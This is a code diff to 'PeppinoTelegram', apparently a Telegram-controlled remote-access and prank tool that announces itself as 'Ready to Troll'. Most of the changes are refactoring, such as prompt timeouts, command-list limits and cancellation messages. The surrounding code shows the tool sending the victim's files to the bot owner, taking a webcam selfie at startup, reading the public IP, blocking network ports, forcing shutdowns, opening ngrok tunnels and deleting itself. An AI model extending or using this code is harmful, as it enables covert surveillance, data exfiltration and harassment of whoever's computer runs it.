@@ -88,7 +88,10 @@ islinux = not iswindows
 cwd_folder = getcwd()
 HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
 BURN_DIRECTORY = gettempdir()
-TELEGRAM_BOT_LIMIT = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)
+TELEGRAM_BOT_FILE_MAX_SIZE = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)
+TELEGRAM_COMMANDS_LIMIT = 100
+TELEGRAM_COMMAND_LENGHT_LIMIT = 32
+TELEGRAM_COMMAND_DESCRIPTION_LENGHT_LIMIT = 256
 GENERATE_COMMANDS_MD = False
 
 
@@ -414,6 +417,7 @@ class PeppinoTelegram:
         self.commands = [
 
             # 🏠 Main Menu & Navigation (no buttons here, just category)
+            Command("menu", self.mainmenu, "Open the main menu.", "menu", "🏠 Main Menu"),
             Command("mainmenu", self.mainmenu, "Open the main menu.", "menu", "🏠 Main Menu"),
             Command("menu_system", self.menu_system, "Open System & Shutdown menu.", "menu", "🛑 System & Shutdown"),
             Command("menu_network", self.menu_network, "Open Network & Remote Access menu.", "menu", "🌐 Network & Remote Access"),
@@ -501,7 +505,7 @@ class PeppinoTelegram:
             Command("camerawallpaper", self.setCameraAsWallpaper, "Webcam as wallpaper.", "parnks", "📷 Camera Wallpaper"),
             Command("setvideowallpaper", self.setvideowallpaper, "Video as wallpaper.", "parnks", "🎞️ Set Video Wallpaper"),
             Command("hdmi_drowning_effect", self.wrapper_for_hdmi_overlay, "Noise overlay effect.", "parnks", "🖥️🌀 Video Signal Drowning Effect"),
-            Command("disturbed_overlay_and_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "parnks", "🌀📻 Video&Sound Disturbance"),
+            Command("disturbed_overlay_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "parnks", "🌀📻 Video&Sound Disturbance"),
             Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "parnks", "👻 Red Text Overlay"),
             Command("setJumpVol", self.setJumpscareVolume, "Set jumpscare's volume.","parnks" , "Set Jumpscare Volume"),
 
@@ -621,9 +625,23 @@ class PeppinoTelegram:
         release_key('f4')
         release_key('alt')
 
-    def ask_yesno(self, custom_message: str = "Confirm? Y/n") -> bool:
+    def ask_yesno(self, custom_message: str = "Confirm action") -> bool:
+        prompt = (
+            f"*{custom_message}*\n\n"
+            "Choose your action:\n"
+            "• *y* / *yes* — proceed\n"
+            "• *n* / *no* — abort"
+        )
+
+        
         print(f"Asking yes/no: {custom_message}")
-        return self.send_prompt(custom_message).lower().strip() == "y"
+        response = self.send_prompt(prompt)
+        if response:
+            response = response.lower().strip()
+        else:
+            return False
+
+        return response in ("y", "yes")
     
     @requires_admin
     def block_chrome(self, timeout: int) -> None:
@@ -634,19 +652,28 @@ class PeppinoTelegram:
     @requires_admin
     def block_port(self, port: int, timeout: int) -> None:
         print(f"Blocking port {port} for {timeout} seconds")
-        loading_bar = self.new_loading_bar_timed_worker("Blocking Port", timeout, lambda x: block_port(port, timeout))
+        loading_bar = self.new_loading_bar_timed_worker("Blocking Port", timeout, block_port, args=(port, timeout))
         loading_bar.start()
 
     @requires_admin
     def block_http(self, timeout: int) -> None:
         print(f"Blocking HTTP for {timeout} seconds")
-        loading_bar = self.new_loading_bar_timed_worker("Blocking HTTP", timeout, block_http, (timeout,))
+        loading_bar = self.new_loading_bar_timed_worker("Blocking HTTP", timeout, block_http, args=(timeout,))
         loading_bar.start()
 
     @requires_admin
     def block_https(self, timeout: int) -> None:
+        warning = "⚠️ *Important Warning*\n\n"\
+            "Blocking HTTPS traffic \\(port 443\\) will make your bot *unreachable* from Telegram until the timeout expires\\.\n"\
+            "Even if you click *Cancel* on the loading bar\\, the block *will not stop* immediately\\.\n\n"\
+            "Are you *absolutely sure* you want to continue\\? *y* / *n*"
+        if not self.ask_yesno(warning):
+            print("Blocking HTTPS request canceled by user.")
+            self.bsendWithMarkdownV2("✅ HTTPS block *cancelled* by you\\.")
+            return
+
         print(f"Blocking HTTPS for {timeout} seconds")
-        loading_bar = self.new_loading_bar_timed_worker("Blocking HTTPS", timeout, block_https, (timeout,))
+        loading_bar = self.new_loading_bar_timed_worker("Blocking HTTPS", timeout, block_https, args=(timeout,))
         loading_bar.start()
 
     def breath(self) -> None:
@@ -688,14 +715,14 @@ class PeppinoTelegram:
 
         size = getsize(path)
 
-        if size <= TELEGRAM_BOT_LIMIT:
+        if size <= TELEGRAM_BOT_FILE_MAX_SIZE:
             with open(path, "rb") as fi:
                 self.bot.sendDocument(self.owner_id, fi)
                 self.bsend("✅ File has been sent successfully!")
             return
 
         base_name = basename(path)
-        part_size = TELEGRAM_BOT_LIMIT - (len(base_name) + 10)
+        part_size = TELEGRAM_BOT_FILE_MAX_SIZE - (len(base_name) + 10)
 
         with open(path, "rb") as f:
             part_num = 1
@@ -913,7 +940,24 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def extract_commands(self) -> list[dict]:
         print("Extracting commands list")
-        return [{"command":c.name, "description":c.description} for c in self.commands]
+        cs = []
+        for command in self.commands:
+            if command.category in ("menu", "utility", "testing", "null"):
+                continue
+            if len(command.name) > TELEGRAM_COMMAND_LENGHT_LIMIT:
+                print(f"Command error: {command.name} name is too long {len(command.name)}")
+                continue
+            if len(command.description) > TELEGRAM_COMMAND_DESCRIPTION_LENGHT_LIMIT:
+                print(f"Command error: {command.name} descritpion is too long {len(command.description)}")
+                continue
+            if len(cs)+1 == TELEGRAM_COMMANDS_LIMIT:
+                print(f"Command error: too many commands added, max is {TELEGRAM_COMMANDS_LIMIT}")
+                break
+            cs.append(
+                {"command"      : command.name,
+                 "description"  : command.description}
+            )
+        return cs
 
     def fake_shutdown(self) -> None:
         print("Faking shutdown")
@@ -1495,6 +1539,10 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         if not self.cap.isOpened():
             self.cap.open(0)
 
+    def operation_canceled(self, info: str|None=None) -> None:
+        print(f"Operation cancelled: {info=}")
+        self.bsendWithMarkdownV2(f"🚫 *Operation cancelled*{f'\n_{info}\\._' if info else ''}")
+
     def parse_audio(self, msg: dict) -> None:
         print("Parsing audio message")
         if 'voice' in msg:
@@ -1557,6 +1605,10 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                         if arg == "self":
                             continue
                         response = self.send_prompt(f"Choose a {arg} for {command}")
+                        if response is None:
+
+                            self.operation_canceled(info="Action timed out.")
+                            return
                         response = response.replace(" ","<SPACE>")
                         args[arg] = response
                     self.parse_command(f"/{command} " + " ".join(args.values()))
@@ -1641,7 +1693,40 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     
     def parse_video_note(self, saved_filepath: str) -> None:
         print(f"Parsing video note: {saved_filepath}")
-        self.overlay_tk.video_note_overlay(saved_filepath)
+        prompt = (
+        "🎯 *Select Position*\n\n"
+        "Choose a position by number:\n\n"
+        "1️⃣ *Top*\n"
+        "2️⃣ *Bottom*\n"
+        "3️⃣ *Left*\n"
+        "4️⃣ *Right*\n"
+        "5️⃣ *Center*\n\n"
+        "Combinations:\n"
+        "6️⃣ *Top\\-Left*\n"
+        "7️⃣ *Top\\-Right*\n"
+        "8️⃣ *Bottom\\-Left*\n"
+        "9️⃣ *Bottom\\-Right*\n\n"
+        "Reply with the corresponding *number*\\."
+        )
+        posx = {
+            "1": "top",
+            "2": "bottom",
+            "3": "left",
+            "4": "right",
+            "5": "center",
+            "6": "top-left",
+            "7": "top-right",
+            "8": "bottom-left",
+            "9": "bottom-right",
+        }
+        pos_idx = self.send_prompt(prompt, delete=True)
+        if pos_idx is None:
+            self.operation_canceled("Action timed out.")
+            return
+        if not pos_idx.isnumeric():
+            self.operation_canceled(f"Choose an option between 1 and {max(posx.keys())}")
+            return
+        self.overlay_tk.video_note_overlay(saved_filepath, posx[pos_idx])
 
     def parse_video(self, msg, document, saved_filepath: str, saved_filename: str) -> None:
         print(f"Parsing video: {saved_filename}")
@@ -2252,7 +2337,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def selfdestruction(self) -> None:
         print("Starting self destruction")
         if not self.ask_yesno():
-            self.bsend("Operation stopped.")
+            self.operation_canceled()
             return
         current_file = realpath(sys.argv[0])
         temp_dir = gettempdir()
@@ -2303,7 +2388,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def shutdown(self, seconds=0) -> None:
         print(f"Shutting down in {seconds} seconds")
         if not self.ask_yesno():
-            self.bsend("Operation stopped.")
+            self.operation_canceled()
             return
         system(f"shutdown -s -t {seconds}")
 
@@ -2427,17 +2512,20 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         else:
             self.bsendWithMarkdownV2("⚠️ You cannot start the tunnel because no ngrok token was provided.")
 
-    def send_prompt(self, question: str) -> str:
+    def send_prompt(self, question: str, timeout: int = 10, delete: bool = False) -> str|None:
         print(f"Sending prompt: {question}")
-        self.bsend(question)
+        msgid = self.bsendWithMarkdownV2(question)
         self.user["status"]="input_requested"
         self.user["last_response"]=None
-        while not self.user["last_response"]:
+        start = monotonic()
+        while not self.user["last_response"] and monotonic()-start < timeout:
             sleep(1)
         else:
             tmp = self.user["last_response"]
             self.user["last_response"]=None
             self.user["status"] = None
+            if delete:
+                self.delete_message(msgid)
             return tmp
 
     def start(self) -> None:
@@ -2487,7 +2575,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.screen_width, self.screen_height = pg.size()
         STARTING_LOG_MESSAGE.edit("GOT SCREEN SIZE")
 
+        STARTING_LOG_MESSAGE.edit("GETTING PUBLIC IP")
         public_ip = get_public_ip()
+        STARTING_LOG_MESSAGE.edit("GETTING BASIC INFO AND WEBCAM SELPHIE")
 
         botstartedmessage = (
             "🚀 *RCPT Online \\- Ready to Troll* 🚀\n\n"
@@ -2537,7 +2627,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.stop_all_tunnels()
             sys.exit()
         else:
-            self.bsend("⛔ *Operation Aborted*")
+            self.operation_canceled()
 
     def test(self) -> None: #this is a test command used for test purpuses, can be used with /test
         print("Running test")
@@ -2549,6 +2639,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         url = f'https://api.telegram.org/bot{self.token}/setMyCommands'
         payload = {'commands': commands}
         response = requests.post(url, json=payload)
+        print(f"Update commands response {response.text}")
         return response.status_code == 200
 
     def waitforface(self, timeout=60):
